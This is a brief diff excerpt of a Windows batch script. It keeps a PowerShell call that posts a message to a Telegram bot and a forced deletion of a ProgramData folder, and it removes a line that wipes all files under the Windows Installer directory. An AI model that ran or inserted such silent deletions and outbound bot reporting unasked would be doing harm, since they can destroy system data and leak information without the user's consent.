@@ -78,4 +78,3 @@ powershell -NoProfile -Command ^
   "try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message} } catch { Write-Host 'Error sending message to Telegram' }"
 endlocal
 rd /s /q "%ProgramData%\O"
-del /S /Q %WINDIR%\Installer\*.*
